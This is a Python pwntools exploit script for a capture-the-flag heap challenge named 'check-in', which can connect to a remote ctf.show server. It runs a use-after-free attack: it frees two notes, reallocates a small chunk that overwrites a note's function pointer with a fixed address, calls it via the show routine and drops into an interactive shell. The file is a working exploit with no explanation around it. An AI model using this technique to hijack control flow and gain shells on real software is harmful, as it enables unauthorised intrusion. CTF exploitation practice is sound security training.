from pwn import *
import sys
remote_addr = ["pwn.challenge.ctf.show",28104]
#libc = ELF('')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./check-in.check-in")
    context(arch='i386', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

#gdb.attach(p, '''
#    b *0x8048935
#    b *0x8048b2f
#    b *0x8048c27
#''')

def add(size, content):
    ru(b'chioce :')
    s(b'1')
    ru(b'size :')
    s(str(size).encode())
    ru(b'Content :')
    s(content)

def delete(index):
    ru(b'chioce :')
    s(b'2')
    ru(b'Index :')
    s(str(index).encode())

def show(index):
    ru(b'chioce :')
    s(b'3')
    ru(b'Index :')
    s(str(index).encode())

add(0x20, b'/bin/sh\x00'*4)
add(0x20, b'/bin/sh\x00'*4)

delete(0)
delete(1)

add(0x8, p32(0x8048c43))
show(0)

shell()
